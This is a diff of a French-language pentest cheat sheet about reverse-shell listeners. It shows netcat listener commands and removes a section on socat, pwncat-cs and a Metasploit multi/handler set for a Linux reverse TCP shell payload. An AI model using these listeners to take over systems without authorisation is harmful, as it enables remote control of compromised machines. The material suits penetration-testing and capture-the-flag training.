@@ -36,6 +36,7 @@ nc -lvvnp 4444
 
 # Sur interface spécifique
 nc -lvnp 4444 -s 10.10.14.5
+
 ```
 
 **Options expliquées** :
@@ -43,42 +44,6 @@ nc -lvnp 4444 -s 10.10.14.5
 - `-v` : Mode verbeux (affiche les connexions)
 - `-n` : Pas de résolution DNS (plus rapide)
 - `-p` : Spécifie le port d'écoute
-
-### Alternatives à Netcat
-
-**1. Socat (plus flexible)**
-```bash
-# Listener simple
-socat TCP-LISTEN:4444,reuseaddr,fork -
-
-# Avec SSL
-socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork -
-
-# Avec logging
-socat TCP-LISTEN:4444,reuseaddr,fork,logfile=connections.log -
-```
-
-**2. Pwncat (moderne et riche en fonctionnalités)**
-```bash
-# Installation
-pip install pwncat-cs
-
-# Listener avec auto-stabilisation
-pwncat-cs -lp 4444
-
-# Bind à une interface
-pwncat-cs -l 10.10.14.5 4444
-```
-
-**3. Metasploit Handler**
-```bash
-msfconsole
-use exploit/multi/handler
-set payload linux/x64/shell_reverse_tcp
-set LHOST 10.10.14.5
-set LPORT 4444
-exploit
-```
 
 ---
 
